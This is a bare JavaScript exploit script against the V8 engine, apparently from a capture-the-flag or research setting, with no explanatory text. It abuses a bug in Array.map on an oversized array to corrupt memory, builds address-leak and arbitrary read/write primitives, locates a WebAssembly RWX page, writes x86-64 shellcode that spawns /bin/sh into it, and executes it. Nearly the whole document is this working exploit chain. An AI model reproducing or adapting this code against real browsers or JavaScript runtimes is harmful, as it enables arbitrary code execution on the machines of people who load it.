function gc() { for (let i = 0; i < 0x10; i++) { new ArrayBuffer(0x1000000); }};

class convert
{
    constructor()
    {
        this.buf=new ArrayBuffer(8)
        this.uint8array=new Uint8Array(this.buf);
        this.float64array=new Float64Array(this.buf);
        this.uint32array=new Uint32Array(this.buf);
    }
    f2i(x)//float64 ==> uint64
    {
        this.float64array[0]=x;
        let sum = 0;
        for (let i = 0 ;i< 8 ;i ++)
        {
            sum += this.uint8array[i]*(0x100**i);
        }
        //print(sum.toString(16));
        return sum;
    }
    i2f(x)//uint64 ==> float64
    {
        let tmp = [];
        tmp[0] = (x % 0x100000000);
        tmp[1] = ((x - tmp[0]) / 0x100000000);
        this.uint32array[0]=tmp[0];
        this.uint32array[1]=tmp[1];
        return this.float64array[0];
    }
}
let conv= new convert();

// throw "err";


Array(2 ** 30);

let a = [1, 2, , , , 3];


function buggy_mapper(el,index){
	if(index > 26){
		throw "err";
	}
	else if(index == 26){
		target = [1.1,2.2,3.3,4.4,5.5];
	}
	return el;
}

function mapping(a) {
  return a.map(buggy_mapper);
};
mapping(a);
mapping(a);

for(let x = 0;x < 10000;x++){
	mapping(a);
}

mapping(a);

a.length = 32 * 1024 * 1024 - 1;
a.fill(1, 0);
a.push(2);
a.length += 500;

try{
	gc();
	mapping(a);
}catch{};

// %DebugPrint(a);
// %DebugPrint(target);

leaker = {a:0x41414141};

idx_leaker = 0;
idx_writer = 0;
for(let i = 0;i<10000;i++){
	if ( conv.f2i(target[i]) == 0x4141414100000000 ){
		idx_leaker = i;
		break;
	}
}

console.log(idx_leaker);

writer = new ArrayBuffer(0x4140);

for(let i = 0;i<100000;i++){
	if ( conv.f2i(target[i]) == 0x4140){
		idx_writer = i;
		break;
	}
}

console.log(idx_writer);


function addrof(obj){
	leaker["a"] = obj;
	return conv.f2i(target[idx_leaker]);
}

function read(addr){
	target[idx_writer+1] = conv.i2f(addr);
	let val_ = new Float64Array(writer);
	return conv.f2i(val_[0]);
}

function write(addr,val){
	target[idx_writer+1] = conv.i2f(addr);
	let val_ = new Uint8Array(writer);
	val_[0] = val;
}

var wasmCode = new Uint8Array([0,97,115,109,1,0,0,0,1,133,128,128,128,0,1,96,0,1,127,3,130,128,128,128,0,1,0,4,132,128,128,128,0,1,112,0,0,5,131,128,128,128,0,1,0,1,6,129,128,128,128,0,0,7,145,128,128,128,0,2,6,109,101,109,111,114,121,2,0,4,109,97,105,110,0,0,10,138,128,128,128,0,1,132,128,128,128,0,0,65,42,11]);
var wasmModule = new WebAssembly.Module(wasmCode);
var wasmInstance = new WebAssembly.Instance(wasmModule, {});
var f = wasmInstance.exports.main;


let wasm_in = addrof(wasmInstance);
console.log(" wasm_in address = " + wasm_in.toString(16));
let rwx_addr = read(wasm_in + 0xf8 - 0x1);
console.log(" rwx_addr = " + rwx_addr.toString(16));

shellcode= new Uint8Array([106,0,72,141,61,17,0,0,0,87,72,141,52,36,72,49,210,72,199,192,59,0,0,0,15,5,47,98,105,110,47,115,104,0])

for(let i = 0;i < shellcode.length;i++){
	var value = shellcode[i];
	write(rwx_addr+i,value);
}

f();
